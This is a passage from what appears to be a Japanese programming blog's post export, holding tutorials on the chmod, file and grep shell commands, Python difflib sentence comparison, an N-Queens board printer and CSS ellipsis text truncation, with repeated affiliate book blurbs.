ですので、\n読み・書き・実行が可能なファイル・ディレクトリであるということになります。\nパーミッションを変更する いろいろな方法があります。\n一般的には（なにが一般的かもわかりませんが）以下の通りとなります。\nsample.txtのパーミッションを664に変更する\n$ chmod 664 sample.txt sample.txtのパーミッションを755に変更する\n$ chmod 755 sample.txt パーミッションの変更内容を確認するには？ chmodコマンドで「-v」オプションを指定すると、コマンドの実行内容が分かるようになります。パーミッションが変更されなかった場合も、現状がどのようになっているかが分かるように表示されます。\n$ chmod -v 755 sample.txt \u0026#39;sample.txt\u0026#39; のモードを 0664 (rw-rw-r--)から 0775 (rwxrwxr-x)へ変更しました ヒント $ chmod コマンドはとても重要、かつセキュリティ上注意が必要なコマンドです。なんでもかんでも777にしておくという大馬鹿ものが後を絶ちませんが、やめましょう。 ヒント -v オプションは常につけて実行しましょう。何を実行したのかを履歴に残しておくことで振り返って確認することができます。 書籍の紹介 詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-07-06T10:12:50+09:00","image":"https://suzukiiichiro.github.io/posts/2022-07-06-01-chmod-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-07-06-01-chmod-suzuki/","title":"（１０）【chmod】シェルスクリプトコマンド活用紹介"},{"content":"fileコマンド ファイルの形式を表示する ファイルのリストから調べる シンボリックリンクの参照先を調べる 圧縮されているファイルを調べる fileコマンドと組み合わせてスクリプトファイルを一覧表示する whichコマンドと組み合わせてコマンドのファイル形式を調べる fileコマンド概要 「file」は、ファイル形式を調べるためのコマンドです。「file ファイル名」で、ファイルの形式が表示されます。テキストファイルの場合は、文字コードが表示されます。\nヒント fileコマンドを使わないとできないことがあります。ファイルの拡張子をみて画像ファイルであり、そのファイルタイプはjpgまたはgifという見分けをしますが、それはあくまで見た目の話で、ファイルの内容を確認するためのコマンドがfileコマンドになります。 fileコマンドの書式 file [オプション] ファイル1 ファイル2 ファイル3……\nfileコマンドの主なオプション オプション 意味 -f リスト\t検査するファイルの名前をリストファイルから読み込む -L シンボリックリンクの参照先を調べる -z 圧縮ファイルの中も検査する -b 出力行の最初にファイル名を表示しない -N 出力を整列するためのファイル名への空白の追加を行わない ヒント 一覧のオプションは一部です。 $ man file などで、fileの使い方を確認してください。 fileコマンド詳細説明 ファイルの形式を表示する システムメッセージを表示する\n$ file sample.jpg ヒント データファイルの場合は「.jpg」や「.mp3」といった拡張子で判断してしまうのが一般的ですが、fileコマンドの場合は拡張子ではなく、あくまでも“ファイルの内容”から判断します ファイルのリストから調べる 「-f」オプションで、ファイルの一覧を指定することができます。例えば、Linuxの設定ファイル「/etc/shells」にはインストールされているシェルがリストアップされていますが、「file -f /etc/shells」で、それぞれのシェルのファイル形式を調べることができます。\n$ file -f /etc/shell シンボリックリンクの参照先を調べる 「-L」オプションで、シンボリックリンクのリンク先を調べることができます。例えば、先ほどの実行結果から「/bin/csh」は、tcshへのシンボリックリンクであることが分かりました。「file -L /bin/csh」で、リンク先であるtcshのファイル形式が表示されます。\n$ file -L /bin/tcsh 圧縮されているファイルを調べる 「-z」オプションで、圧縮されているファイルの元の形式を調べることができます。\nbash-5.1$ file /usr/local/bin/openmpi-1.8.3.tar.gz /usr/local/bin/openmpi-1.8.3.tar.gz: gzip compressed data, last modified: Thu Sep 25 14:12:57 2014, max compression, from Unix bash-5.1$ ヒント $ man file などで、fileの使い方を確認してください。 書籍の紹介 詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-07-05T10:22:08+09:00","image":"https://suzukiiichiro.github.io/posts/2022-07-05-01-file-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-07-05-01-file-suzuki/","title":"（９）【file】シェルスクリプトコマンド活用紹介"},{"content":"grepコマンド コマンドの実行結果から必要な箇所だけを抽出する 単語単位で検索する 前後の行も表示する 行番号付きで表示する 複数の文字列を指定して検索する 複数の文字列を指定して検索する（正規表現） 検索文字列をファイルから読み込む どちらも含む行を探したい場合 文字列を含まない行を対象にする grepコマンド概要 「grep」コマンドは、ファイル中の「文字列（パターン）」が含まれている行を表示するコマンドで、UNIX/Linuxで、最も頻度高く利用されているコマンドの一つです。\n文章中に検索したい文字列の位置や頻出回数を確認する\nディレクトリ中のファイル一覧を作成し、そのファイル一覧から、該当するファイル名を探索する。\nヒント 抽出した結果をさらに「パイプ｜コマンド」で絞り込んだり、その結果を別のファイルに出力したりすることも簡単にできます。 grepコマンドの書式 grep [オプション] 検索パターン ファイル\nコマンド | grep [オプション] 検索パターン\ngrepコマンドの主なオプション オプション 意味 -i 大文字と小文字を区別しない -v パターンに一致しない行を表示する -n 行番号を併せて表示する -C 一致した行の前後の行も表示する -e 検索パターンを指定する -f ファイルに書かれているパターンを検索する ヒント 一覧のオプションは一部です。 $ man grep などで、grepの使い方を確認してください。 grepコマンド詳細説明 コマンドの実行結果から必要な箇所だけを抽出する 「dmesg」コマンド（起動時のシステムメッセージを再表示するコマンド）の実行結果から、grepコマンドで“volume”という文字列を含む行だけを表示したい場合は「dmesg | grep volume」と指定します\nシステムメッセージを表示する\n$ dmesg システムメッセージの出力から「volume」を含む行を抽出する\n$ dmesg | grep volume 大文字と小文字を「-iオプション」を付与して区別しないで抽出する\n$ dmesg | grep -i volume ヒント dmesg コマンドは、システムメッセージを表示するコマンドです。 単語単位で検索する 「volume」という文字列を検索したい場合、、検索結果には「volume」と「vboxvolume」が表示される場合もあります。“volumeという単語のみ”を検索対象としたい場合には、「-w」オプション（\u0026ndash;word-regexp）を使用します\n単語単位で検索する\n$ dmesg | grep -i -w volume 前後の行も表示する 文字列を検索する際には、該当する行の前後も表示されていると分かりやすい場合があります。例えば、前後2行ずつ表示したい場合は、「-2」のように数字で指定します。これは「-C（\u0026ndash;context=）」オプションと同じです。\n$ dmesg | grep -w -C2 volume ヒント ログなどでの利用は効果的ではありませんが、ドキュメント内を検索する場合に、GoogleのSnippetのように前後の文章が表示されることで、よりわかりやすくなります。さらに次の項目では、検索結果の評判号を表示させることもできます。 行番号付きで表示する grepコマンドでの検索結果に行番号を付けて表示したい場合は、「-n」オプション（\u0026ndash;line-number）を使用します。「行番号:」のように表示されますが、前後の行も併せて表示している場合は、前後の行は「行番号-」のように「-」記号で、該当する行は「:」記号で示されます。\n$ dmesg | grep -w -C2 -n volume 複数の文字列を指定して検索する grepコマンドで「volumeまたはkeybagを含む行を検索」のように、複数の文字列を検索したい場合には、「-e」オプションを付けて、それぞれが「検索パターン」であることを明示します。\n$ dmesg | grep -i -e keybag -e volume 複数の文字列を指定して検索する 複数の文字列を検索したい場合、正規表現で“または”という意味の「|」記号を使って指定することもできます。\n$ dmesg | grep -i \u0026#34;keybag\\|volume\u0026#34; ヒント ここでは OR 条件で抽出することを目的としています。AND条件で抽出する場合は、grep コマンドを「|」パイプコマンドで連結させます。 どちらの検索ワードも含む行\n$ dmesg | grep -i volume | grep -i keybag 検索文字列をファイルから読み込む 検索したい文字列が常に決まっている場合や、他のコマンドで単語をリストアップしているなどで、検索文字列のリストがあるような場合、「-f」オプションでリストのファイルを指定するとよいでしょう。\n$ cat wordlist keybag volume $ dmesg | grep -i -f wordlist ヒント この使い方は意外と知られていないのです。一般的にはwordlistをシェルスクリプトであらかじめ作成しておき、while read line; do などで wordlistを順番にgrepコマンドに渡す手法が多いです。 :\u0026gt; wordlist echo \u0026#34;keybag\u0026#34; \u0026gt;\u0026gt; wordlist; echo \u0026#34;volume\u0026#34; \u0026gt;\u0026gt; wordlist; cat wordlist | while read line; do echo \u0026#34;$line での検索\u0026#34;; dmesg | grep \u0026#34;$line\u0026#34; ; echo \u0026#34;\u0026#34;; done どちらも含む行を探したい場合 「どちらの検索ワードも含む行」としたい場合は、検索結果をさらにgrepするのが簡単です。\n$ dmesg | grep -i volume $ dmesg | grep -i keybag # どちらの検索ワードも含む行 $ dmesg | grep -i volume | grep -i keybag 文字列を含まない行を対象にする grepコマンドで「～を含まない行」だけを表示したい場合は「-v」オプション（「\u0026ndash;invert-match」オプション）を使います。\n# keybag を含みvolumeを含まない検索結果 $ dmesg | grep -i keybag | grep -v volume ヒント -v オプションはgrepコマンドのオプションの中で最も強力で利用頻度が高いです。「パターンに一致しない行を表示する」という意味合いとなります。 書籍の紹介 詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-07-04T13:21:13+09:00","image":"https://suzukiiichiro.github.io/posts/2022-07-04-01-grep-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-07-04-01-grep-suzuki/","title":"（８）【grep】シェルスクリプトコマンド活用紹介"},{"content":"pythonで自然言語解析してみよう 新聞記事の要約を試みています。要約の文字数が指定されているので文抽出型の要約だけですと指定文字数よりオーバーすることがあります。\nこれを文生成型の要約を補完的に適用することによって文字数を指定文字数まで調整できるようなものを作りたいというのが最終目標です。\n最終目標に向けて前処理をコツコツしてきたいと思います。\nまずは、教師データとして、元の文章とお手本の要約した文章があるとして、文単位で比較していき似ているけどちょっと違う文を抽出してみたいと思います。\n元の文章 国際パラリンピック委員会（ＩＰＣ）は３日、声明を発表し、前日２日に中立選手としての北京パラリンピック（４日開幕）への参加を容認したＲＰＣ（ロシアパラリンピック委員会）、ベラルーシの選手について、一転して出場を認めないことを発表した。ＩＰＣは声明で「ＲＰＣおよびベラルーシの選手のエントリーを拒否することを決定しました」と発表した。パーソンズ会長のコメントとして「圧倒的な数の関係者と連絡をとりオープンに議論した。彼らは私たちが決定を再考しなければ、２０２２年パラリンピック大会に重大な結果をもたらす可能性が高いと語った。複数のＮＰＣ、中には政府、チーム、アスリートからの働きかけを受けていたが、競技に参加しなさそうでもあった」と、撤回に至った経緯を説明した。 要約文 国際パラリンピック委員会（ＩＰＣ）は３日、声明を発表し、前日２日に中立選手としての北京パラリンピック（４日開幕）への参加を容認したＲＰＣ（ロシアパラリンピック委員会）、ベラルーシの選手について、一転して出場を認めないことを発表した。ＩＰＣが「ＲＰＣおよびベラルーシの選手のエントリーを拒否することを決定しました」と発表した。 元の文章と要約文を比較してみると、元の文章は全部で4文ありますが、要約文は上の2文を抽出しています。そして2文目の「ＩＰＣは声明で」が「ＩＰＣが」に修正されています。\nこれを、修正のあった文だけ抽出し、さらに修正内容も出力してみたいと思います。\nこの例だと\n元の文章 ＩＰＣは声明で「ＲＰＣおよびベラルーシの選手のエントリーを拒否することを決定しました」と発表した。 要約文 ＩＰＣが「ＲＰＣおよびベラルーシの選手のエントリーを拒否することを決定しました」と発表した。 修正内容 「は声明で」-\u0026gt;「が」 包含関係にあるものはスキップしたい 似ているけどちょっと違うという文をピックアップしたいので要約が元の文章の文の数だけ減らしただけのものはスキップしたいと思います。\n例えば、以下の例だと要約文は元の文章の第2文までをそのまま抜粋しただけなので教師データからは除外したいと思います。\nプログラムでは、要約文と元の文章が包含関係にあるものはスキップするという処理を入れたいと思います。\n元の文章 国際パラリンピック委員会（ＩＰＣ）は３日、声明を発表し、前日２日に中立選手としての北京パラリンピック（４日開幕）への参加を容認したＲＰＣ（ロシアパラリンピック委員会）、ベラルーシの選手について、一転して出場を認めないことを発表した。ＩＰＣは声明で「ＲＰＣおよびベラルーシの選手のエントリーを拒否することを決定しました」と発表した。パーソンズ会長のコメントとして「圧倒的な数の関係者と連絡をとりオープンに議論した。彼らは私たちが決定を再考しなければ、２０２２年パラリンピック大会に重大な結果をもたらす可能性が高いと語った。複数のＮＰＣ、中には政府、チーム、アスリートからの働きかけを受けていたが、競技に参加しなさそうでもあった」と、撤回に至った経緯を説明した。 要約文 国際パラリンピック委員会（ＩＰＣ）は３日、声明を発表し、前日２日に中立選手としての北京パラリンピック（４日開幕）への参加を容認したＲＰＣ（ロシアパラリンピック委員会）、ベラルーシの選手について、一転して出場を認めないことを発表した。ＩＰＣは声明で「ＲＰＣおよびベラルーシの選手のエントリーを拒否することを決定しました」と発表した。 python で包含関係を調べる良い方法がないかなと調べたところ in 演算子というのを使うのが手っ取り早そうです。\na in b とすると a が bに包含されている場合はTrueをそうでない場合はFalseを返します。\nプログラムは以下になります。\nsummary=\u0026#34;　国際パラリンピック委員会（ＩＰＣ）は３日、声明を発表し、前日２日に中立選手としての北京パラリンピック（４日開幕）への参加を容認したＲＰＣ（ロシアパラリンピック委員会）、ベラルーシの選手について、一転して出場を認めないことを発表した。ＩＰＣは声明で「ＲＰＣおよびベラルーシの選手のエントリーを拒否することを決定しました」と発表した。 \u0026#34; original=\u0026#34;　国際パラリンピック委員会（ＩＰＣ）は３日、声明を発表し、前日２日に中立選手としての北京パラリンピック（４日開幕）への参加を容認したＲＰＣ（ロシアパラリンピック委員会）、ベラルーシの選手について、一転して出場を認めないことを発表した。ＩＰＣは声明で「ＲＰＣおよびベラルーシの選手のエントリーを拒否することを決定しました」と発表した。パーソンズ会長のコメントとして「圧倒的な数の関係者と連絡をとりオープンに議論した。彼らは私たちが決定を再考しなければ、２０２２年パラリンピック大会に重大な結果をもたらす可能性が高いと語った。複数のＮＰＣ、中には政府、チーム、アスリートからの働きかけを受けていたが、競技に参加しなさそうでもあった」と、撤回に至った経緯を説明した。\u0026#34; print(summary in original) 類似度の高い文を見つける 包含関係にある文章をスキップしたら、あとは文ごとに修正の有無を確認していきたいと思います。\n要約文の文と元の文を1文目から比較して内容が同じであれば次の文へ移動し、似ている文は違いを抽出していきます。\n似ている文を見つける方法としてdifflib.SequenceMatcher のratioというのが使えそうです。\nr = difflib.SequenceMatcher(None, 比較したい文字列1, 比較したい文字列2).ratio()\nとすると戻り値として類似度が返却されます。1.0が完全一致で0.95とかだと95%同一という意味です。\nimport difflib summary=\u0026#34;ＩＰＣは声明で「ＲＰＣおよびベラルーシの選手のエントリーを拒否することを決定しました」と発表した。\u0026#34; original=\u0026#34;ＩＰＣが「ＲＰＣおよびベラルーシの選手のエントリーを拒否することを決定しました」と発表した。\u0026#34; r = difflib.SequenceMatcher(None, summary, original).ratio() print(r) 0.9230769230769231 差分を出力する 閾値を決めて類似度の高い文が見つかったら差分を出力します。差分の出力もdifflibでできそうです。\nDifferのcompare メソッドで差分を出力できるみたいです。\ndiff = difflib.Differ() diff_array = diff.compare(summary, original) for df in diff_array : print(df) Ｉ Ｐ Ｃ + が - は - 声 - 明 - で 「 Ｒ Ｐ Ｃ お よ び ベ ラ ル ー シ の 選 手 の エ ン ト リ ー を 拒 否 す る こ と を 決 定 し ま し た 」 と 発 表 し た 。 この出力結果から「は声明で」-\u0026gt;「が」に変換するにはどうすれば良いでしょうか。\n結構大変そうなので次回にします。\n","date":"2022-03-02T18:25:55+09:00","image":"https://suzukiiichiro.github.io/posts/2022-03-03-01-ani/python_hua0d4d4b24f4da3a102e4452ac738b95f_23090_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-03-03-01-ani/","title":"第1回 pythonで自然言語解析（1）"},{"content":"対象解除法が正しいか検証してみよう 今回は対象解除法が正しいかどうかを検証するためプログラムを改造してクイーンを設置した場所を出力するようにしてみましょう。\nプログラムソースは以下のURLにあります。 https://github.com/suzukiiichiro/N-Queens/blob/master/03Python/py04_nqueen.py\nprintoutメソッドを利用しよう クイーンの設置場所を出力するメソッドを作って321行目と322行目の間に設置しましょう。\nABOARDに各行のクイーンの設置場所を記憶しているのでこれを利用しましょう。\npy01,py02で使っていたprintoutメソッドを修正して利用しましょう。\nprintoutメソッドを見てみましょう。\ndef printout(): \u0026#34;\u0026#34;\u0026#34;printout()\u0026#34;\u0026#34;\u0026#34; global COUNT # pylint: disable=W0603 COUNT += 1 #インクリメントはこのように書きます print(COUNT, end=\u0026#34;: \u0026#34;) #改行したくないときは, を行末にいれます for i in range(SIZE): print(ABOARD[i], end=\u0026#34;\u0026#34;) print(\u0026#34;\u0026#34;) どこを修正すれば良いでしょうか\nstotalの値を出力したいのでメソッドの引数に追加しましょう。\n引数はメソッドを宣言している()の中に書きます。\nクイーンの設置場所を出力するのでメソッド名はprintboardにしましょう。\nまた、py01,py02とは違いpy03以降はSIZEは可変になったため無くなっています。\nグローバル変数にはないためnqueenメソッドから引数でsizeを渡してあげましょう\ndef printboard(stotal,size): 冒頭でCOUNTとstotalの値を出力するようにしましょう\n改行しても良いので end=\u0026quot;: \u0026ldquo;はいらないです\npy03以降COUNTは使わなくなっているので宣言を追加する必要がありあます。\nグローバル変数宣言の一番下にCOUNT = 0 を追加しましょう\nprint(COUNT,\u0026#34;:\u0026#34;,stotal) ABOARDには各行のクイーンの設置場所が記憶されています。\nABOARD[2]=4 だったら3行目の右から5番目にクイーンが置かれています。\nちなみにメソッド内でABOARDをglobal宣言していませんが、参照するだけだったらglobal宣言いらないみたいです。\n各行がクイーンが置かれている場所「o」置かれていない場所が「-」になるようにしてみましょう。\nprintoutは各行ごとにfor文を回していましたが各セルごとに出力するためfor文を追加しましょう。\niで行、jで行の中の各セルごとにみていってクイーンが置かれている場所の時だけ「o」を出力しましょう。\nそして行の終わりに print(\u0026rdquo;\u0026quot;)で改行を入れましょう。\nfor i in range(size): for j in range(size): if ABOARD[i]==j: print(\u0026#34;o\u0026#34;, end=\u0026#34;\u0026#34;) else: print(\u0026#34;-\u0026#34;, end=\u0026#34;\u0026#34;) print(\u0026#34;\u0026#34;) ボードの出力が終わったら見やすいようにセパレータを入れてみましょう\nCOUNT = 0 #BOARD出力 def printboard(stotal,size): global COUNT COUNT += 1 print(COUNT,\u0026#34;:\u0026#34;,stotal) for i in range(size): for j in range(size): if ABOARD[i]==j: print(\u0026#34;o\u0026#34;, end=\u0026#34;\u0026#34;) else: print(\u0026#34;-\u0026#34;, end=\u0026#34;\u0026#34;) print(\u0026#34;\u0026#34;) print(\u0026#34;########\u0026#34;) 新しく関数を追記するときは決まりは特にないのですがグローバル変数宣言の直下(223行目あたり)に置きましょう。\nそして、331行目,332行目の間でprintboardメソッドを呼び出しましょう。\nstotal = symmetryops(size)\t# 対称解除法の導入 printboard(stotal,size) if stotal != 0: 出力結果を見てみよう それでは出力を見てみましょう。\npy04はn4からn15まで実行するのでn8だけ実行してみましょう。\n214行目のMAX を9にして\nminを8にして実行してみてください\npython py04_nqueen.py こんな感じで出力されるかと思います。\n1 : 8 o------- ----o--- -------o -----o-- --o----- ------o- -o------ ---o---- ######## 2 : 8 o------- -----o-- -------o --o----- ------o- ---o---- -o------ ----o--- ######## 3 : 0 o------- ------o- ---o---- -----o-- -------o -o------ ----o--- --o----- ######## 先頭の1はstotalが8なので90度回転して同じものがあるということです。\n実際に90度回転して同じでstotalが0のものがあるか探してみましょう。\n1 : 8 o------- ----o--- -------o -----o-- --o----- ------o- -o------ ---o---- ######## 1を反時計回りに90度回転させると\n以下の形になります。\n--o----- -----o-- ---o---- -o------ -------o ----o--- ------o- o------- この形のクイーンの配置があるか調べてみると\n22 : 0 --o----- -----o-- ---o---- -o------ -------o ----o--- ------o- o------- 22番目のクイーンの配置に同じものがありました。\nまたstotalも0ですので正しそうです。\nこんな感じで検証できそうですが手動で全部調べるのはちょっと辛いですよね。。。\n次回はプログラムを使って検証する方法を試してみましょう。\n","date":"2022-02-17T17:25:55+09:00","image":"https://suzukiiichiro.github.io/posts/2022-02-17-01-ani/chess_hub5f46a8b8fc9e255d0122f98accfe16c_94129_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-02-17-01-ani/","title":"第9回 pythonでNQueen（エイトクイーン）対象解除法（2）"},{"content":"HTMLのレイアウトでは時には文字がはみ出した際に、3点リーダーと呼ばれる「…」をつける場合があります。\n普通に記述してしまえば対応できますが、それだと文章を切ってしまったり、文が意味のわからないものになってしまい、SEOとしてはNGとなります。\nまた、文章の長さが可変の場合はレイアウトが大きく崩れてしまう原因にも繋がります。\n今回はCSSを使って3点リーダーを付ける方法を紹介します。\nこの方法を知っていれば、1行でも複数行でも3点リーダーを表示させることができるようになり、レスポンシブルデザインのようなマルチデバイスでもレイアウトが崩れずに表示させることが可能です。\n3点リーダーとは 3点リーダーとは「文章を省略する意味」と「文章に余韻を持たせたり沈黙を表現したりする意味」の2つがあります。\nHTMLで使用する場合は前の「文章を省略する」という意味で使うことが大多数です。\n1行の3点リーダーの場合 下記のようなHTMLがあり、幅をを10emとしておきましょう。\n普通に記述すると、1emでどんどん改行されてすべての文字が表示されるかと思います。\n\u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;p\u0026gt;Lorem ipsum dolor sit amet, consectetur adipisicing elit...\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; .container { background: #eee; overflow: hidden; width: 10em; padding: 10px; } 上記のHTMLとCSSを実行した結果になります。10emで改行されているのがわかるかと思います。\nこれを基準にして、三点リーダーに対応していきましょう。\nダメなやり方 - 直接htmlを修正して文字を合わせる まずはダメな3点リーダーのやり方を見てみましょう。\nそれはcssではなく、直接htmlを修正して文字を合わせるという方法です。\ncssはさきほどのままで、htmlを修正して1行かつ、末尾に三点リーダーをつけてみます。\n\u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;p\u0026gt;Lorem ipsum dolo...\u0026lt;/p\u0026gt; 